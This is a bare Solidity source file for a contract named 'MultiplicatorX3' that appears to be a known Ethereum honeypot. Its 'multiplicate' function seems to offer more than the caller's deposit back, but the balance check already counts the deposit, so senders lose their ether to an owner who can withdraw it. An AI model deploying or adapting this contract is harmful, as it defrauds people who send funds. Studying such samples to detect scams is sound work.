1 pragma solidity ^0.5.0;
2 
3 contract MultiplicatorX3 {
4     address payable public Owner;
5     
6     constructor() public {
7         Owner = msg.sender;
8     }
9    
10     function withdraw() payable public {
11         require(msg.sender == Owner);
12         Owner.transfer(address(this).balance);
13     }
14     
15     function multiplicate(address payable adr) public payable{
16         if(msg.value>=address(this).balance) {        
17             adr.transfer(address(this).balance+msg.value);
18         }
19     }
20 }